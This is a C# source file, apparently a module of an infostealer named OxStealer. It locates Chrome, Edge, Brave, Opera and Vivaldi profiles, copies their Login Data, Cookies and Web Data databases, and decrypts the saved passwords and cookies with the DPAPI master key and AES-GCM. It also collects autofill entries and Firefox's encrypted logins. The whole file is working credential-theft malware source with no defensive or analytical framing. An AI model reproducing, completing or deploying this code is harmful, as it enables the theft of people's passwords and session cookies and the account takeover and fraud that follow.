using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.Data.Sqlite;

namespace OxStealer.Modules
{
    internal static class Browser
    {
        public static Dictionary<string, object> GrabAll()
        {
            var result = new Dictionary<string, object>();
            var ud = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            var chromium = new Dictionary<string, string>
            {
                ["Chrome"]  = Path.Combine(ud, "Google", "Chrome", "User Data"),
                ["Edge"]    = Path.Combine(ud, "Microsoft", "Edge", "User Data"),
                ["Brave"]   = Path.Combine(ud, "BraveSoftware", "Brave-Browser", "User Data"),
                ["Opera"]   = Path.Combine(ud, "Programs", "Opera", "User Data"),
                ["Vivaldi"] = Path.Combine(ud, "Vivaldi", "User Data"),
            };

            foreach (var kv in chromium)
            {
                if (!Directory.Exists(kv.Value)) continue;
                var ls = Path.Combine(kv.Value, "Local State");
                var profiles = new List<string> { Path.Combine(kv.Value, "Default") };
                foreach (var d in Directory.GetDirectories(kv.Value, "Profile *"))
                    profiles.Add(d);

                foreach (var prof in profiles)
                {
                    if (!File.Exists(Path.Combine(prof, "Login Data"))) continue;
                    var data = DumpChromium(prof, ls);
                    if (data.Count > 0) result[$"{kv.Key}:{Path.GetFileName(prof)}"] = data;
                }
            }

            var ff = DumpFirefox();
            if (ff.Count > 0) result["Firefox"] = ff;
            return result;
        }

        static Dictionary<string, object> DumpChromium(string prof, string lsPath)
        {
            var outData = new Dictionary<string, object>();
            byte[] key = Utils.Dpapi.MasterKey(lsPath);
            if (key == null) return outData;

            var loginDb = Copy(Path.Combine(prof, "Login Data"));
            if (File.Exists(loginDb))
            {
                var passes = new List<object>();
                using var con = new SqliteConnection($"Data Source={loginDb};Mode=ReadOnly");
                con.Open();
                using var cmd = con.CreateCommand();
                cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
                using var r = cmd.ExecuteReader();
                while (r.Read())
                {
                    var url = r.GetString(0);
                    var user = r.GetString(1);
                    var enc = (byte[])r[2];
                    string pass = enc.Length > 0
                        ? (enc[0] == 0x76 ? Utils.AesGcm.Decrypt(key, enc) : Encoding.UTF8.GetString(Utils.Dpapi.Decrypt(enc)))
                        : "";
                    if (!string.IsNullOrEmpty(pass))
                        passes.Add(new { url, user, pass });
                }
                if (passes.Count > 0) outData["passwords"] = passes;
            }

            var cookieDb = Copy(Path.Combine(prof, "Network", "Cookies"));
            if (File.Exists(cookieDb))
            {
                var cookies = new List<object>();
                using var con = new SqliteConnection($"Data Source={cookieDb};Mode=ReadOnly");
                con.Open();
                using var cmd = con.CreateCommand();
                cmd.CommandText = "SELECT host_key, name, value, encrypted_value FROM cookies";
                using var r = cmd.ExecuteReader();
                while (r.Read())
                {
                    var host = r.GetString(0);
                    var name = r.GetString(1);
                    var val = r.GetString(2);
                    var enc = (byte[])r[3];
                    string dec = !string.IsNullOrEmpty(val)
                        ? val
                        : (enc.Length > 0
                            ? (enc[0] == 0x76 ? Utils.AesGcm.Decrypt(key, enc) : Encoding.UTF8.GetString(Utils.Dpapi.Decrypt(enc)))
                            : "");
                    if (!string.IsNullOrEmpty(dec))
                        cookies.Add(new { host, name, value = dec });
                }
                if (cookies.Count > 0) outData["cookies"] = cookies;
            }

            var webDb = Copy(Path.Combine(prof, "Web Data"));
            if (File.Exists(webDb))
            {
                var autofill = new List<object>();
                using var con = new SqliteConnection($"Data Source={webDb};Mode=ReadOnly");
                con.Open();
                using var cmd = con.CreateCommand();
                cmd.CommandText = "SELECT name, value FROM autofill";
                using var r = cmd.ExecuteReader();
                while (r.Read()) autofill.Add(new { name = r.GetString(0), value = r.GetString(1) });
                if (autofill.Count > 0) outData["autofill"] = autofill;
            }

            return outData;
        }

        static Dictionary<string, object> DumpFirefox()
        {
            var outData = new Dictionary<string, object>();
            var baseDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Mozilla", "Firefox", "Profiles");
            if (!Directory.Exists(baseDir)) return outData;

            foreach (var prof in Directory.GetDirectories(baseDir))
            {
                var logins = Path.Combine(prof, "logins.json");
                if (!File.Exists(logins)) continue;
                try
                {
                    var json = JsonDocument.Parse(File.ReadAllText(logins));
                    var arr = new List<object>();
                    foreach (var e in json.RootElement.GetProperty("logins").EnumerateArray())
                    {
                        arr.Add(new
                        {
                            url = e.GetProperty("hostname").GetString(),
                            user = e.GetProperty("encryptedUsername").GetString(),
                            pass = e.GetProperty("encryptedPassword").GetString()
                        });
                    }
                    if (arr.Count > 0) outData["passwords"] = arr;
                }
                catch { }
            }
            return outData;
        }

        static string Copy(string src)
        {
            if (!File.Exists(src)) return null;
            var tmp = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + Path.GetExtension(src));
            try { File.Copy(src, tmp, true); return tmp; } catch { return null; }
        }
    }
}